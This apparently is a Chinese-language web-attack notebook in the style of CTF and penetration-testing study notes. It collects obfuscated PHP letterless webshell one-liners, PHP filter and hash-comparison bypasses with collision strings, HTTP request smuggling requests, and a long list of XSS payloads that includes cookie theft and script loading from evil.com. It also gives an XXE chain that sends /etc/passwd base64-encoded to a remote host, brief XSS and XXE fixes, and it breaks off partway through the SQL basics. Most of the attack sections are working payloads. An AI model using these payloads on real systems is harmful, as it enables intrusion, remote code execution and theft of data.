        $_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
      

    P牛RCE
      // $_POST['_']($_POST['__']);
      //即构造直接构造eval函数 比如_=system __=ls 即eval(system(ls))
      $_=[].''; // Array
      $__ = $_[3]; // a
      $_ = $_[0]; // A
      $___= '_';
      $_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;
      $____ = $_; //O
      $_++; //P
      $___.= $_; //P
      $___.=$____;
      $_++;$_++;$_++; //S
      $___.=$_; //POS
      $_++;
      $___.=$_; //POST
      $$___['_']($$___['__']);

    chr RCE
      $_=[]._;$_3=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$_3;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);

```

### PHP 无字母RCE 的内容绕过
```plain
1.过滤 _
  a.或绕过
  
  b.取反绕过
  
  c.{}括号构造
    ${值}{参数}
    ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
    原理：${_GET}{%ff}();&%ff=phpinfo//?shell=${_GET}{%ff}();&%ff=phpinfo，如果需要传参可以再括号内添加
  
  d.反引号执行命令
    ?><?=`{${~%A0%B8%BA%AB}{%ff}}`?>&%ff=ls /

2.过滤 ; 
  php短标签绕过

3.过滤$
  https://cloud.tencent.com/developer/article/1838778
```

### PHP 函数的绕过
```plain
# parse_str
  存在漏洞，他不会判断字符是否存在，如果使用其他方法传递字符，就可以进行覆盖
  甚至可以解析 &1=xxx 即 %261=xxx 进行函数内赋值
  
  $b = $_GET["b"];
  @	parse_str($b);
  if ($a[0] != 'QNKCDZO' && md5($a[0]) == md5('QNKCDZO')) {
    $num = $_POST["num"]

  就可以使用 $b=a[0]=s878926199a 覆盖

# prep_match()
  1.数组绕过 
    preg_match只能处理字符串，当传入的subject是数组时会返回false
  2.PCRE回溯次数限制
    因为 php.ini 配置中回溯次数限制是100万次，超过100万次会服务崩溃，从而达成绕过
  3.换行符绕过
    如果匹配头为 /^ 则为换行符绕过，其匹配开头，换行符则进入下一行

# basename()
  当路径中含有非ascii的字符的时候，字符会被过滤掉
  比如 basebname(/index.php/%ff) 输出 index.php

# intval
  绕过某数字
  $var以0开头则会被8进制解析
  $var一0x开头则会被16进制解析
  如果intval中传入小数，则会被自动进行整数化，类似python中的int函数
  如果intval中传入数字带英文的字符，则会只保留int数字，字母会被舍去
  如果intval中传入运算公式，intval会进行计算
  如果intval中传入~数字，则会进行取反操作，这时候可以进行两次取反

  绕过数字比较 传入两个数组则会被若比较为True
  如果intval中传入数组
  如果数组不为空，则返回1，如果为空则返回0

# md5
  # 弱比较（== 只比较值不比较类型）
  1.字符型与数字型比较
    若字符型数字开头为数字，转换为数字，部位数字则为null弱比较与0相等
    ("123abc"==123) => true
    ("123"==123) => true
    ("123abc"=="123") => false
    ("abc123"==0) => true

  2.字符型与字符型弱比较
    0e比较
    0e123 == 0e345 => True
    0e123abc == 0e345 => False 不能包含英文

  3.数组绕过
    md5不能加密数组，返回NULL，传参两个数组进行绕过
    传参规律 name[] = 123,password[]=456

  4.0e绕过 
    原理：md5值为0e，在 php 中会被转化为0
    s878926199a
    s155964671a
    s214587387a
    QLTHNDT
    QNKCDZO
    EEIZDOI
    240610708
    0e215962017

    5.双md5绕过，即解码后为两次0e
    CbDLytmyGm2xQyaLNhWn
    770hQgrBOjrcqftrlaZk
    7r4lGXCH2Ksu2JNT3BYM

  # 强比较（完全相同字符绕过
    整数型与字符型报错
    ("123"===123) => False
  
    若是没有内容相同：
      数组绕过(error 报错绕过，除非error_reporting(0) 不显示报错

    若是限制内容不同，强碰撞，需要说明的是这是一个密码学家破译的，不需要理解原理：
      fascoll工具进行md5强碰撞（需要url编码后并使用 BurpSuite 发送才行）
      M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
      M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
      
      psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2
      psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2

# sha1
  array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1

# 万能密码
  ffifdyop
  绕过原理：
    md5(string,raw) : raw=TRUE 加密数据原始16进制格式 raw=False 32字符的16进制数字
    即：True返回MD5的16进制解码原始数据 'or'6É].é!r,ùíb.
    False返回md5 276f722736c95d99e921722cf9ed621c
```

### PHP 注释符号
```plain
<?php
// 单行注释
/* 多行注释
?>
*/
```

# 请求走私 HTTP1.1 偏多
## 请求走私 内容长度错误
通过控制 Content-Length

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/35229002/1781308888887-ffab7c67-c41a-4a37-84b8-1490c61df4a9.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/35229002/1781308906026-d1b7b870-c7e2-41c0-b428-73f68ec6ff04.png)

## 请求走私基础概念
块大小

```plain
POST /submit HTTP/1.1
Host: good.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
    
q=smuggledData # 14 长度大小
```

分块传输

```plain
POST /submit HTTP/1.1
Host: good.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
    
b # 代表下一个块大小
q=smuggledData 
0 # 代表行结束
```

## 请求走私 CL.TE
CL.TE 是 攻击者通过控制传输内容，同时发送 Content-Length 和 Transfer-Encoding

Content-Length: 130    # CL 通过前端的 Content-Length 能将后面 Transfer-Encoding 之后的数据都发送给后端

Transfer-Encoding: chunked    # TE 后端主要解析 Transfer-Encoding，发现是 chunked 从而导致不同解释，认为是一个新区块

从而解析第二个数据

```plain
POST /search HTTP/1.1
Host: example.com
Content-Length: 130						# CL 通过前端的 Content-Length 能将后面 Transfer-Encoding 之后的数据都发送给后端
Transfer-Encoding: chunked		# TE 后端主要解析 Transfer-Encoding，发现是 chunked 从而导致不同解释，认为是一个新区块

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true
```

前端解析了 130 长度的块

```plain
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true
```

后端分析到 chunked，截止到 0 ，然后后面一个 POST 请求会当作一个新的请求

```plain
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true
```

## 请求走私 TE.CL
和 CL.TE 完全相反，前端先解析 TE，后端解析 CL

```plain
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0
```

前端分析到 Transfer-Encoding: chunked

```plain
78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0
```

后端因为分析到 第一个的 Content-Length: 4，只处理 \n78\n 就截止了，后面 POST 请求被当作一个新的请求

## 请求走私 TE.TE（报错）
```plain
POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0
```

前端服务器读到第一个 chunked

```plain
4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0
```

后端读到 chunked1 会认为是错误的，或者其他报错原因导致 POST 当作第二个请求

## 请求走私 HTTP 2
前端 HTTP2，后端 HTTP 1.1 则会进行 HTTP 协议降级

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/svg/35229002/1781311169126-01cfa278-9cbb-4be7-ab94-6c77989b4de0.svg)

Http2 CL 发送的时候使 CL = 0，发送给 HTTP 1.1 的时候还是会发送 HELLO

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/svg/35229002/1781311264576-990e2b3c-41d8-4369-9ef7-2ba5fad2c3d6.svg)



Http2 TE 发送 chunked 的时候，因为 HTTP2 发送的是二进制会发一个块，但 后端因为 0 阶段， HTTP 1.1 会处理两个请求

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/svg/35229002/1781311328882-8b6265a8-3a99-42f8-91d1-1ca4a010bf75.svg)



CRLF 注入，直接通过换行注入，开始注入为 Content-Length=0 ，HTTP 1.1 则会解析为两个包

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/svg/35229002/1781311462579-b5045cf6-feb6-4d78-aad5-224617fc2d6d.svg)

## 请求走私 h2c（告诉有 HTTP2 服务）
一般建立 HTTP/2 时，客户端会发送一个 HTTP 1.1 告诉机器可以 h2c，切换到 HTTP2

```plain
python3 h2csmuggler.py -x https://10.114.142.92:8200/ https://10.114.142.92:8200/private
```

## 请求走私 websocket （告诉有 ws 服务）
建立和 HTTP2 一样，开始会发送 HTTP 1.1 的 服务，如果没有升级返回 426，升级则返回 ws 通道

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/svg/35229002/1781312191092-513bc2a8-7235-429c-9387-34855cf172ad.svg)

# XSS
原理：构造闭合标签，将前部分内容闭合，后部分以标签进行加载，在前端执行

利用条件：输入的内容能在前端被解析成功

```html
<!-- 原理：原本显示标签为 --> 
<pre>Hello test</pre> 

<!-- 但是插入语句 <b>标签 变为显示执行 -->
<pre>Hello <b>test</pre>
```

## 反射型 XSS
原理：传入恶意脚本，服务器处理返回网页中，浏览器解析时，进行执行

## 存储型 XSS
多见于评论区，但是储于服务器，可以长期恶意执行，payload与绕过与反射型相同

## DOM型 XSS
Document Object Model，纯前端执行，输入时直接在前端被解析，不经过服务器

## XSS 的传递姿势
```plain
# 当 js html 渲染的时候，使用标签构造
  <scirpt src= xsspt ;</script>

# 当 js text 渲染的时候，直接使用 js
  alert(`localhost?cookie=${document.cookie}`)

# 当有 XSS 平台时候，尝试直接构造 XSS ，把 平台网址当作加载资源
  <scirpt src= xsspt ;</script>

# 当没有 XSS 平台的时候，尝试构造 模板 去传参
    `` 反引号可以让其执行代码，其中 ${} 模板可以进行执行代码
    alert(`localhost?cookie=${document.cookie}`)

# 远程加载 js
  http://www.foo.com/xssme.html#document.write("<script/src=//www.evil.com/alert.js></script>")
  http://www.evil.com/xssme.html#document.write("<script/src=//www.foo.com/alert.js></script>")
```

## XSS 常用标签
```plain
# 加载型
  # <scirpt>
  <scirpt>alert("xss");</script>
  <scirpt src= ;</script>

  # <video>
  <video><source onerror="alert(1)">

  # <audio>
  <audio src=x  onerror=alert("xss");>

  <a>标签
  <a href="javascript:alert(`xss`);">xss</a>

  # <iframe>标签
  <iframe src=javascript:alert('xss');></iframe>

  # <img>标签
  <img src=javascript:alert('xss')>//IE7以下
  
  # 利用link远程包含js文件，在无CSP的情况下才可以
  <link rel=import href="http://127.0.0.1/1.js">

# 事件型
  # <img>
  <img src=1 onerror=alert("xss");>

  # <input>
  <input onfocus="alert('xss');">
  <input onblur=alert("xss") autofocus><input autofocus>  # 竞争焦点，从而触发onblur事件
  <input onfocus="alert('xss');" autofocus>  # 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发

  # <details>
  <details ontoggle="alert('xss');">
  <details open ontoggle="alert('xss');">  # 使用open属性触发ontoggle事件，无需用户去触发

  # <svg>
  <svg onload=alert("xss");>

  # <select>
  <select onfocus=alert(1)></select>
  <select onfocus=alert(1) autofocus>  # 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发

  # <iframe>
  <iframe onload=alert("xss");></iframe>

  # <video>
  <video><source onerror="alert(1)">

  # <audio>
  <audio src=x  onerror=alert("xss");>

  # <body>
  <body/onload=alert("xss");>
  <body
  onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>  # 利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发

  # <textarea>
  <textarea onfocus=alert("xss"); autofocus>

  # <keygen>
  <keygen autofocus onfocus=alert(1)>  # 仅限火狐

  # <marquee>
  <marquee onstart=alert("xss")></marquee>  # Chrome不行，火狐和IE都可以

  # <isindex>
  <isindex type=image src=1 onerror=alert("xss")>  # 仅限于IE

# javascript伪协议
  <a>标签
  <a href="javascript:alert(`xss`);">xss</a>

  # <iframe>标签
  <iframe src=javascript:alert('xss');></iframe>

  # <img>标签
  <img src=javascript:alert('xss')>//IE7以下

  # <form>标签
  <form action="Javascript:alert(1)"><input type=submit>

# 其它
  # expression属性
  <img style="xss:expression(alert('xss''))">  # IE7以下
  <div style="color:rgb(''�x:expression(alert(1))"></div>  # IE7以下
  <style>#test{x:expression(alert(/XSS/))}</style>  # IE7以下

  # background属性
  <table background=javascript:alert(1)></table>  # 在Opera 10.5和IE6上有效
```

## XSS 内容绕过
```plain
-----------------------------------------------
如果为内容绕过可以尝试 php 内容绕过，效果相同
-----------------------------------------------

# 过滤 <>
  onfocus="alert('xss'); // 其特性不需要任何 <> 闭合，只要被引入即可弹窗
  <input onfocus="alert('xss');">

# 过滤空格
  <img/src="x"/onerror=alert("xss");>  # 用/代替空格

# 过滤双引号，单引号
  <img src="x" onerror=alert(`xss`);>  # 如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号

# 过滤括号
  <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">  # 当括号被过滤的时候可以使用throw来绕过

# 过滤关键字
  <ImG sRc=x onerRor=alert("xss");> # 大小写绕过
  <imimgg srsrcc=x onerror=alert("xss");> # 双写关键字（仅过滤一次）

# 字符拼接
  <img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">  # 利用eval
  <script>top["al"+"ert"](`xss`);</script>  # 利用top

# 编码绕过 （搭配 eval 进行绕过）
  1.Unicode编码绕过 会自动解析
    <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&	#41;&#59;"> 
    <img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0	073\u0022\u0029\u003b')">

  2.url编码绕过
    <img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
    <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%7	3%63%72%69%70%74%3E"></iframe>

  3.Ascii码绕过
    <img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,3	4,41,59))">

  4.hex绕过
    <img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>

  5.八进制
    <img src=x onerror=alert('\170\163\163')>

  6.base64绕过
    <img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29t			Jw=='))">
    <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">

# 过滤url地址
  使用url编码
    <img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>

  使用IP
    <img src="x" onerror=document.location=`http://2130706433/`>  # 十进制IP
    <img src="x" onerror=document.location=`http://0177.0.0.01/`>  # 八进制IP
    <img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>  # hex
    <img src="x" onerror=document.location=`//www.baidu.com`>  # 4.html标签中//代替http://

# 其它字符混淆
可利用注释、标签的优先级等
  1.<<script>alert("xss");//<</script>
  2.<title><img src=</title>><img src=x onerror="alert(`xss`);">  # 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
  3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
```

## XSS 修复建议
```plain
输出到前端时，进行编码，防止被浏览器解析闭合执行恶意代码，比如直接转换为web实体编码

# PHP
  htmlspecialchars() 转义 <>&"'

# JavaScript Node.js
  escapeHtml()sanitizeHtml()escapeHtml() 转义 <>&"'

# Python
  escape()htmlhtml.escape()markupsafe.escape() 转义 <>"'

# ASP
  HttpUtility.HtmlEncode() 转义 <>&

# C#
  HttpUtility.HtmlEncode()userCommentParameters.AddWithValue()SqlCommand

# 存储型
  由于存储型经过数据库，那么对于数据库来说，可以进行转义 mysqli_real_escape_string()
  
# DOM类型
  document.write()encodeURIComponent()textContent
```

# XXE
原理：xml的外部实体载入，载入本地文件，在前端输出

利用条件：MIME 为 xml，且传参数据 xml，可以自行修改为 xml 触发

<!-- 这是一张图片，ocr 内容为：POST /DOLOGIN.PHP HTTP/1.1 HOST:XXE-1ABS.COM USER-AGENT: HOZILLA/5.0 (WINDOWS NT 10.0; WIN64; X64; RV:127.0) TEXT/XML,*/*;*;Q.01 APP LICATION/XML, ACCEPT: 0.7,ZH-HK;Q-0.5,EN-US;Q-0.3,EN;Q-0.2 ZH-CN,ZH:Q-0.8,2H-TW;Q-0.7 DEFLATE,BR ACCEPT-ENCODING:GZIP, DE CONTENT-TYPE: APPLICATION/XML;CHARSET-UTF-8 X-REQUESTED-WITH: XMLHTTPREQUEST CONTENT-LENGTH: 65 ORIGIN:HTTP://XXE-LABS.COM CONNECT ION: CLOSE REFERER:HTTP://XXE-LABS.COM PRIORITY:U-1 <USER> <USERNAME> ADMIN USERNAINE> <PASSWORD> ADMIN PASSWORD> -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1718695112419-9df27fad-ace9-4159-9185-b19cf8ade162.png)

## XML 实体语法 和 引用实体类型
```plain
XML有自己的 DTD 语法，同时可以外部实体和内部实体，其实可以看做 XML 的一个变量、

DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。
DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。

# 语法：
  内部声明DTD
    <!DOCTYPE 根元素 [元素声明]>
  内部声明实体
    <!ENTITY 实体名称 "实体的值">
  
  引用外部DTD文档
    <!DOCTYPE 根元素 SYSTEM "文件名">
    <!DOCTYPE 根元素 PUBLIC "public_ID" "文件名">
  引用外部实体
    <!ENTITY 实体名称 SYSTEM "URI">
    <!ENTITY 实体名称 PUBLIC "public_ID" "URI">

  调用实体
    & 变量名;

	参数实体：参数实体可以在实体内以 % 调用
  	<!DOCTYPE note [
		<!ENTITY % common "CDATA">
		<!ELEMENT name (%common;)>
		]>
			<note>
        	<name>John Doe</name>
			</note>

# 调用方法：
  内部声明DTD[引用外部实体]
  内部实体
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE message [	# 定义该文档为message根元素
    <!ELEMENT message ANY> # 定义messag接受任何元素 定义message有两个元素 message(username,password)
    <!ENTITY tst "test">	# 建立实体
    ]>

    # 上面message定义完元素后，下面为定义根元素的子元素
    <message>
      <user>&tst;</user>	# & 引用实体 如果遇到 python 的话，如果调用 name，需要修改 user
    </message>

  外部实体
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE message [
    <!ENTITY xxe SYSTEM "http://127.0.0.1" >]>	# 建立实体
  
    <message>
      <user>&xxe;</user>
    </message>

```

## XXE 实体类型
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/gif/35229002/1718695959362-96007d90-2cf4-4625-b722-cca7224e3599.gif)

## XXE 绕过
```plain
# 关键字
  ENTITY``SYSTEM``file等关键词被过滤-->使用编码方式绕过：UTF-16BE
  cat payload.xml | iconv -f utf-8 -t utf-16be > payload.8-16be.xml
```

## XXE 实战数据外带
本地起服务

```php
<?php
  $ip = $_GET["data"];   
echo $ip;

# 或者 python 启 http.server 服务
```

创建一个 dtd 实体文件

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://10.13.64.210:8000/?p=%file;'>">
```

抓包引入

```plain
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://10.13.64.210:8000/test.dtd">
%remote;%int;%send;
]>


解释说明
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://10.13.64.210:8000/?p=%file;'>">

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://10.13.64.210:8000/test.dtd">
%remote;%int;%send;
]>


客户端：%remote;%int;%send; 这三个参数可以在实体内引用资源，%remote;调用实体，%int 引用实体内 的 %int，%send 引用 %int 内的 %send
服务端：调用实体 int ，然后继续调用内部 send ，send %file 调用实体 file

为何不能直接传dtd并使用参数实体：因为参数实体不能在内部dtd使用，只能在外部实体上使用，即只能远程载入外部dtd
补充说明： &#x25 是不能在 XML 文档中直接使用的特殊字符或保留字符，防止xml解析错误的，可以使用以下代替：
	&lt;对于小于符号 （<)
	&gt;对于大于符号 （>)
	&amp;对于与号 （&)
```

## XXE 修复建议
```plain
一般修复建议为过滤 <, >, &, ',  ".

# java 使用并禁用 DTD DocumentBuilderFactory
	DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
	dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
	dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
	dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
	dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
	dbf.setXIncludeAware(false);
	dbf.setExpandEntityReferences(false);
	DocumentBuilder db = dbf.newDocumentBuilder();

# .NET 配置器忽略外部实体
	XmlReaderSettings settings = new XmlReaderSettings();
	settings.DtdProcessing = DtdProcessing.Prohibit;
	settings.XmlResolver = null;
	XmlReader reader = XmlReader.Create(stream, settings);

# PHP 禁止通过 libxml 加载外部实体
	libxml_disable_entity_loader(true);

# python 使用防止XML漏洞的库 defusedxml
	from defusedxml.ElementTree import parse
	et = parse(xml_input)
```

# SQL 注入
## SQL 数据库基础操作
```plain
# 其他说明：
  部分数据库名输入不行，可以使用``反引号，表示特殊的名称
  
# 打开mysql
  mysql
    -u 指定用户
    -h 指定连接地址
    -P 指定端口
    -p 密码
    
  mysql -uroot -p

# 数据库操作
  show databases; # 显示数据库
  select * from mysql.innodb_index_stats; # 等效 databases
    所包含字段：database_name table_name index_name last_update stat_name stat_value
  create database name; # 创建数据库
  use name; # 进入数据库 
  进入数据库后，表，列都可以直接显示，而不需要一个一个进入下一级

# 表操作
  show tables; # 显示表
  select table_name from mysql.innodb_index_stats; # 等效 show tables
  # 一种新思路，如果实在构造不出来，直接跑字典了
    and (select GROUP_CONCAT(flag) FROM localhost.table_name)
  SELECT TABLE_NAME FROM database_name;  # 显示表名
  create table name (id int(5),name varchar(5)); # 创建表，传参为需要注明数据类型
  
  use .. # 返回上一级
  use /; 返回上一级
  
# 显示列
  SHOW COLUMNS FROM table_name ; # 显示列名
  SELECT COLUMN_NAME FROM table_name;  # 显示列名

# 显示行（即列的具体数值）
  SELECT * FROM table_name;
  SELECT GROUP_CONCAT(column_name) FROM tablename;
  # SELECT GROUP_CONCAT(flag) FROM test.flag;

# 查询语句
  SELECT <目标列名序列> -- 需要哪些列
  	FROM <表名> [JOIN <表名> ON <连接条件>] -- 来自哪些表
  	[WHERE <行选择条件>] -- 根据什么条件  # 条件
  	[GROUP BY <分组依据列>]  # 对分组进行排列，可排列多个分组 GROUP BY id,name
  	[HAVING <组选择条件>]  # 根据分组条件排列
  	[ORDER BY <排列依据列>]  # 对结果进行排序 ORDER BY 列名或者数字
    [limit <lim,max筛选数据>]
  
# 更新数据 UPDATE users SET password = 'newpassword' WHERE id = 1;

# 为表起别名
  原字段名 [AS] 列别名

# 比较运算符
  算数运算符 =	<>, != > < <= >=
  逻辑运算符 NOT AND OR
  模糊匹配 LIKE '匹配字段' # %表示0个或多个，_表示一个字符
  之间判断 BETWEEN 值 AND 值
  之内判断 IN(集合)
  空值判断 NULL | IS NULL

# 连接查询
  相等连接
    SELECT a.id,b.name FROM testa a,testb b
  自身连接
    SELECT a.id id,b.name name FROM test a,test b
  不等连接
    SELECT a.id,b.name FROM testa a,testb b WHERE a.id BETWEEN b.local AND b.local2
  左外连接
    FROM 表1 LEFT OUTER JOIN 表2 ON 表1.列 = 表2.列
  右外连接
